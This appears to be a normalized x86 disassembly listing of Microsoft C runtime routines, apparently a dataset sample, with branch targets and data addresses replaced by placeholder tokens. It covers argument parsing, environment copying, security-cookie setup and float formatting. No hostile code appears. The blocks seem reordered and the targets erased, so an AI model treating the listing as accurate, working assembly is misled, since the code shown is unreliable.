push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_446eac
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_43af14
pop ecx
test eax eax
jne r-xdata
movzx ecx [ ebp - 0x185 ]
mov eax ecx
and ecx 0x7
mov dl 0x1
shl dl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] dl
xor dl dl
jmp r-xdata
mov al [ ebp - 0x185 ]
sub al dl
movzx edi dl
movzx edx al
cmp dl [ ebp - 0x185 ]
jae r-xdata
mov eax [ ebp - 0x1a8 ]
inc [ ebp - 0x1c8 ]
lea ecx [ ebp - 0x204 ]
push ecx
push eax
push [ ebp - 0x1bc ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x185 ]
dec eax
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
add esp 0x10
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov [ ebp - 0x194 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_446eac
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1a8 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_446eac
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov [ ebp - 0x194 ] eax
movzx eax al
push eax
call sub_43af14
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov [ ebp - 0x194 ] eax
and [ ebp - 0x19c ] eax
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1a8 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_446eac
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov [ ebp - 0x194 ] eax
movzx eax al
sub_448086
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_438ce6
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_44b5f1
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_4461f2
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_44813e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_44a2e2
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_44818e
mov edi edi
push ebp
mov ebp esp
push esi
call sub_43ff67
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_4482d8
mov edi edi
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
movzx eax [ esi ]
test ax ax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ax 0x3d
je r-xdata
push ebx
push 0x4
inc edi
push edi
call sub_43de17
mov ebx eax
pop ecx
pop ecx
mov [ rw-data ] ebx
test ebx ebx
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_442a37
pop ecx
lea esi [ esi + eax * 2 + 0x2 ]
inc edi
mov esi [ rw-data ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
pop ebx
push esi
call sub_442a37
cmp [ esi ] 0x3d
pop ecx
lea edi [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_4381f8
and [ rw-data ] 0x0
and [ ebx ] 0x0
mov [ rw-data ] 0x1
xor eax eax
lea esi [ esi + edi * 2 ]
push 0x2
push edi
call sub_43de17
pop ecx
pop ecx
mov [ ebx ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_4381f8
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push edi
push eax
call sub_442994
add esp 0xc
test eax eax
jne r-xdata
pop ecx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_43f873
int3
add ebx 0x4
sub_4483b4
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
xor edx edx
push edi
mov edi [ ebp + 0xc ]
mov [ ebx ] edx
mov esi ecx
mov [ edi ] 0x1
cmp [ ebp + 0x8 ] edx
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov ecx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ecx ] esi
inc [ ebx ]
test esi esi
je r-xdata
mov edi [ ebp + 0xc ]
xor ecx ecx
test edx edx
sete cl
push 0x22
add eax 0x2
mov edx ecx
pop ecx
jmp r-xdata
movzx ecx [ eax ]
add eax 0x2
test cx cx
je r-xdata
mov cx [ eax ]
mov [ esi ] cx
add esi 0x2
test edx edx
jne r-xdata
sub eax 0x2
jmp r-xdata
cmp cx 0x20
je r-xdata
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
cmp cx 0x9
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax edx
je r-xdata
movzx ecx [ eax ]
cmp ecx 0x20
je r-xdata
xor ecx ecx
mov [ esi - 0x2 ] cx
inc [ edi ]
pop edi
pop esi
leave
retn
mov [ eax ] edx
add eax 0x2
jmp r-xdata
cmp ecx 0x9
jne r-xdata
cmp [ eax ] dx
je r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
inc [ edi ]
mov ecx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ecx ] esi
cmp [ eax ] 0x5c
je r-xdata
add eax 0x2
inc edx
cmp [ eax ] 0x22
jne r-xdata
test edx edx
jne r-xdata
test dl 0x1
jne r-xdata
dec edx
test esi esi
je r-xdata
movzx ecx [ eax ]
test cx cx
je r-xdata
shr edx 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
inc [ ebx ]
push 0x5c
pop ecx
mov [ esi ] cx
add esi 0x2
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] edx
jne r-xdata
xor ecx ecx
xor edi edi
cmp [ ebp - 0x4 ] ecx
sete cl
mov [ ebp - 0x4 ] ecx
cmp [ eax + 0x2 ] 0x22
jne r-xdata
inc [ ebx ]
mov edi [ ebp + 0xc ]
jmp r-xdata
xor ecx ecx
mov [ esi ] cx
add esi 0x2
test edi edi
je r-xdata
cmp ecx 0x20
je r-xdata
add eax 0x2
jmp r-xdata
xor edx edx
cmp [ eax ] dx
je r-xdata
add eax 0x2
jmp r-xdata
test esi esi
je r-xdata
cmp ecx 0x9
je r-xdata
xor edi edi
inc edi
xor edx edx
jmp r-xdata
inc [ ebx ]
mov [ esi ] cx
add esi 0x2
sub_44850a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x104
mov esi rw-data
push esi
xor eax eax
xor ebx ebx
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
mov edi esi
mov edi eax
cmp [ eax ] bx
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x8 ]
cmp ecx 0x7fffffff
jae r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
lea ebx [ ebp - 0x8 ]
xor ecx ecx
mov eax edi
call sub_4483b4
mov ebx [ ebp - 0x4 ]
pop ecx
pop ecx
cmp ebx 0x3fffffff
jae r-xdata
lea eax [ ecx + ebx * 2 ]
add eax eax
add ecx ecx
cmp eax ecx
jb r-xdata
push eax
call sub_43ddd2
mov esi eax
pop ecx
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ esi + ebx * 4 ]
push esi
lea ebx [ ebp - 0x8 ]
mov eax edi
call sub_4483b4
mov eax [ ebp - 0x4 ]
dec eax
pop ecx
mov [ rw-data ] eax
pop ecx
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4485b8
mov edi edi
push esi
call [ GetEnvironmentStringsW@IAT ]
mov esi eax
xor ecx ecx
cmp esi ecx
jne r-xdata
cmp [ esi ] cx
je r-xdata
xor eax eax
pop esi
retn
push ebx
sub eax esi
lea ebx [ eax + 0x2 ]
push edi
push ebx
call sub_43ddd2
mov edi eax
pop ecx
test edi edi
jne r-xdata
add eax 0x2
cmp [ eax ] cx
jne r-xdata
push ebx
push esi
push edi
call sub_43a8a0
add esp 0xc
jmp r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax edi
pop edi
pop ebx
pop esi
retn
add eax 0x2
cmp [ eax ] cx
jne r-xdata
sub_448610
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_448636
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_44865c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_4486f7
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_4487b1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_43edab
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_43af14
test eax eax
movsx eax [ esi ]
push eax
call sub_43edab
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
add esi 0x2
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_448825
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_4488a7
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_4488c3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_44d315
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_44d26d
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_44891f
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_43c860
inc eax
push eax
push esi
add esi edi
push esi
call sub_437db0
add esp 0x10
sub_448964
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_438ce6
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
call sub_43c04c
push 0x16
cmp [ ebp + 0xc ] ecx
jle r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
call sub_43c04c
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_44891f
pop esi
mov [ eax ] esi
call sub_43f8c5
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
mov cl [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] cl
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
inc esi
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_43f873
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] eax
je r-xdata
push r--data
push ebx
push esi
call sub_43f118
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop edi
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_437db0
add esp 0xc
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi + 0x2 ] al
mov eax edx
pop esi
pop ebx
leave
retn
add [ esi + 0x4 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi + 0x3 ] al
mov eax edx
sub_448ac5
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_44d523
add esp 0x14
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_43c04c
mov [ eax ] ebx
call sub_43f8c5
mov eax ebx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
test esi esi
setg cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_448964
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add eax edi
add ecx eax
push ecx
call sub_44d3bd
add esp 0x10
test eax eax
je r-xdata
sub_448b8c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_448ac5
add esp 0x18
pop ebp
retn
sub_448bac
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_438ce6
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_43c04c
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_43c04c
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
mov [ eax ] esi
call sub_43f8c5
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi ] 0x30
mov [ esi + 0x1 ] al
mov ecx [ edi + 0x4 ]
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
mov [ esi + 0x2 ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
add esi 0x3
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_448b8c
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov [ esi ] 0x30
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
push 0x65
add esi 0x2
push esi
call sub_44d240
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_44d6a0
add ax 0x30
movzx eax ax
cmp eax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_44d6a0
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_43a820
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
call sub_44d6a0
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
